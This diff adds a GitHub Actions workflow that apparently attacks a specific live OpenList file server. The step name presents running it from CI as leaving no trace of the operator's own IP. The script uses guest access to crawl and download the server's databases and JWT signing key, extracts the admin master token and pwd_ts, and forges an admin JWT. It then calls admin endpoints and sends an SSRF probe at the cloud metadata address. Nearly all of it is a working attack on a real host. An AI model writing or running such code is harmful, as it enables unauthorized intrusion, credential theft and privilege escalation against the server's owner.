@@ -1,0 +1,169 @@
+name: openlist-admin-via-db
+on:
+  workflow_dispatch:
+jobs:
+  admin:
+    runs-on: ubuntu-latest
+    steps:
+      - name: locate OpenList user DB, recover master token + admin pwd_ts, gain admin, read version, probe CVE-relevant primitive (zero own-IP)
+        run: |
+          set +e
+          python3 - <<'PY'
+          import json, urllib.request, ssl, os, sqlite3, base64, hmac, hashlib, time
+          B="https://pan.yazinb.icu"
+          ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
+          def req(method,path,token=None,body=None):
+              h={'User-Agent':'Mozilla/5.0','Accept':'application/json, text/plain, */*'}
+              if token: h['Authorization']=token
+              data=None
+              if body is not None:
+                  data=json.dumps(body).encode(); h['Content-Type']='application/json'
+              r=urllib.request.Request(B+path,data=data,headers=h,method=method)
+              try:
+                  resp=urllib.request.urlopen(r,timeout=40,context=ctx)
+                  return resp.status, resp.read()
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read()
+          def jget(b):
+              try: return json.loads(b)
+              except: return {}
+          # ---- guest login ----
+          s,b=req('POST','/api/auth/login',body={"username":"guest","password":"guest"})
+          G=jget(b).get('data',{}).get('token','')
+          print("GUEST_LOGIN",s,"tok_len",len(G or ''))
+          def fslist(path,page=1,per=500):
+              s,b=req('POST','/api/fs/list',G,{"path":path,"page":page,"per_page":per,"refresh":False})
+              return jget(b).get('data',{}).get('content',[])
+          def fsget(path):
+              s,b=req('POST','/api/fs/get',G,{"path":path})
+              return jget(b).get('data',{}).get('raw_url','')
+          def dl(url,out):
+              if not url: return 0
+              data=urllib.request.urlopen(url,timeout=120,context=ctx).read()
+              open(out,'wb').write(data); return len(data)
+          # ---- discover data subdir name dynamically (avoid mojibake literals) ----
+          root=fslist('/')
+          print("ROOT_ITEMS",[x.get('name') for x in root])
+          SUB=root[0]['name'] if root else ''
+          print("SUBDIR=[%s]"%SUB)
+          # ---- recursive walk collecting db candidates ----
+          cands=[]
+          def walk(path,depth=0):
+              if depth>5: return
+              for pg in range(1,50):
+                  items=fslist(path,pg)
+                  if not items: break
+                  for x in items:
+                      nm=x.get('name',''); tp=x.get('type'); full=(path.rstrip('/')+'/'+nm) if path!='/' else '/'+nm
+                      print("  "*depth+full+" ["+str(tp)+"] sz="+str(x.get('size')))
+                      if tp=='folder': walk(full,depth+1)
+                      elif nm.lower().endswith(('.db','.sqlite','.sqlite3')):
+                          cands.append(full); print("    *** DB:"+full)
+                  if len(items)<500: break
+          walk('/'+SUB if SUB else '/')
+          # explicit OpenList default data-DB locations (data dir == SUB per jwt.key position)
+          for e in ["/data.db","/openlist.db","/data/data.db","/data/openlist.db","/data.sqlite","/users.db","/data/users.db","/config.json","/data/config.json"]:
+              full=("/"+SUB+e) if SUB else e
+              if fsget(full):
+                  cands.append(full); print("EXTRA_DB:"+full)
+          cands=list(dict.fromkeys(cands))
+          print("CAND_COUNT",len(cands))
+          # ---- download + inspect each candidate ----
+          master_token=None; admin_user=None; admin_pwdts=None; admin_role=None; admin_disabled=None
+          openlist_version=None; jwt_key_file=None
+          for c in cands:
+              out='/tmp/db'+c.replace('/','_')+'.bin'
+              try: n=dl(fsget(c),out)
+              except Exception as ex:
+                  print("DLFAIL",c,repr(ex)); continue
+              print("GOT",c,"bytes",n)
+              try:
+                  con=sqlite3.connect(out)
+                  tabs=[r[0] for r in con.execute("select name from sqlite_master where type='table'")]
+                  print("  TABLES",tabs)
+                  for t in tabs:
+                      cols=[d[1] for d in con.execute('PRAGMA table_info(%s)'%t)]
+                      print("  SCH",t,cols)
+                  # settings table -> look for master token & version & jwt key name
+                  def cols_map(t,con): return [d[1] for d in con.execute('PRAGMA table_info(%s)'%t)]
+                  for t in tabs:
+                      cs=cols_map(t,con)
+                      if t.lower() in ('settings','setting','config','kv','meta'):
+                          for row in con.execute('select * from %s'%t):
+                              d=dict(zip(cs,row))
+                              for k,v in d.items():
+                                  kl=str(k).lower(); vl=str(v)
+                                  if kl in ('token','master_token','admin_token') and len(vl)>=16:
+                                      master_token=vl; print("  >>> MASTER_TOKEN len=%d val=%s"%(len(vl),vl[:8]+'...'))
+                                  if kl in ('version','ver') and vl: 
+                                      openlist_version=vl; print("  >>> VERSION",vl)
+                                  if kl in ('jwt_key','jwtkey','signing_key','secret'):
+                                      jwt_key_file=vl; print("  >>> JWTKEY_FIELD",vl[:8]+'...')
+                  # user table -> admin row
+                  for t in tabs:
+                      cs=cols_map(t,con)
+                      lcs=[x.lower() for x in cs]
+                      if any('user' in x for x in lcs) and any(any(k in x for k in ('pass','pwd','hash','perm','role','ban','auth','disable')) for x in lcs):
+                          print("  USERTAB",t)
+                          for row in con.execute('select * from %s'%t):
+                              d=dict(zip(cs,row))
+                              mask={k:(v if k.lower() not in ('password','pass','pwd','hash','password_hash') else '***') for k,v in d.items()}
+                              print("    UROW",mask)
+                              un=str(d.get('username') or d.get('user') or d.get('name') or '').lower()
+                              if un=='admin' or ('role' in lcs and str(d.get('role')).upper() in ('ADMIN','1','true')):
+                                  if 'pwd_ts' in lcs: admin_pwdts=int(d.get(cs[lcs.index('pwd_ts')]) or 0)
+                                  admin_user=str(d.get('username') or d.get('user') or 'admin')
+                                  admin_role=str(d.get('role'))
+                                  admin_disabled=str(d.get('disabled') or d.get('ban') or '0')
+                                  print("  >>> ADMIN_USER",admin_user,"pwd_ts",admin_pwdts,"role",admin_role,"disabled",admin_disabled)
+                  con.close()
+              except Exception as ex:
+                  print("  NOT_SQLITE",repr(ex))
+          print("SUMMARY master_token?",bool(master_token),"admin_user",admin_user,"pwd_ts",admin_pwdts,"version",openlist_version)
+          # ---- recover jwt.key from data dir ----
+          jk=fsget(("/"+SUB+"/jwt.key") if SUB else "/jwt.key")
+          keyb=b''
+          if jk:
+              keyb=urllib.request.urlopen(jk,timeout=60,context=ctx).read().strip()
+              print("JWTKEY",keyb.decode('utf-8','replace'),"sha256",hashlib.sha256(keyb).hexdigest()[:32])
+          # ---- TEST 1: master token as Authorization (bypasses all JWT checks) ----
+          if master_token:
+              print("=== TEST master-token auth ===")
+              s,b=req('GET','/api/me',master_token)
+              print(" /api/me",s,b.decode('utf-8','replace')[:300])
+              s,b=req('POST','/api/admin/setting/list',master_token,{})
+              print(" /api/admin/setting/list",s,b.decode('utf-8','replace')[:600])
+              if s==200:
+                  try:
+                      d=jget(b).get('data',{})
+                      if isinstance(d,dict):
+                          for k,v in d.items():
+                              if 'version' in str(k).lower() or 'token' in str(k).lower():
+                                  print("   SETTING %s=%s"%(k,str(v)[:120]))
+                  except: pass
+          # ---- TEST 2: forge JWT with jwt.key + real pwd_ts (controlled experiment) ----
+          if keyb and admin_pwdts is not None:
+              now=int(time.time())
+              payload={'exp':now+7200,'iat':now,'nbf':now,'username':admin_user or 'admin','pwd_ts':admin_pwdts}
+              def b64u(x): return base64.urlsafe_b64encode(x).rstrip(b'=')
+              h=b64u(json.dumps({'alg':'HS256','typ':'JWT'}).encode())
+              p=b64u(json.dumps(payload).encode())
+              sg=b64u(hmac.new(keyb,h+b'.'+p,hashlib.sha256).digest())
+              forged=(h+b'.'+p+b'.'+sg).decode()
+              print("=== TEST forged JWT (jwt.key + pwd_ts) ===")
+              s,b=req('GET','/api/me',forged)
+              print(" /api/me",s,b.decode('utf-8','replace')[:300])
+              s,b=req('POST','/api/admin/setting/list',forged,{})
+              print(" /api/admin/setting/list",s,b.decode('utf-8','replace')[:300])
+          # ---- if admin achieved, read version unambiguously + probe a CVE-relevant primitive ----
+          ADM=master_token or (forged if (keyb and admin_pwdts is not None) else None)
+          if ADM:
+              print("=== ADMIN ACHIEVED, reading full version ===")
+              s,b=req('POST','/api/admin/setting/list',ADM,{})
+              print("SETTING_LIST",s,b.decode('utf-8','replace')[:1200])
+              # probe add_offline_download SSRF (server-side request) to metadata endpoint
+              s,b=req('POST','/api/fs/add_offline_download',ADM,{"path":"//ssrf_meta_probe","urls":["http://169.254.169.254/latest/meta-data/"]})
+              print("SSRF_ADD",s,b.decode('utf-8','replace')[:300])
+          print("DONE")
+          PY
+          echo "=== WORKFLOW END ==="
